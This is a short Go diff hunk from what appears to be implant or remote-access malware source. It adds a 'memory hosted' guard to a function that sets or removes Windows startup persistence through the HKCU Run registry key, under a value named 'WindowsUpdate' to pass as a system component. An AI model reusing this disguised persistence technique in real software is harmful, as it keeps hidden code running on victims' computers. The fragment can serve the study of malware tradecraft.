@@ -176,6 +176,9 @@ func persistenceAction(install bool, cfg *config) (string, error) {
 		_, _ = exec.Command("reg.exe", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/f").CombinedOutput()
 		return "Persistence removed", nil
 	}
+	if memoryHosted() {
+		return "", errMemoryHosted
+	}
 	self, err := os.Executable()
 	if err != nil {
 		return "", err
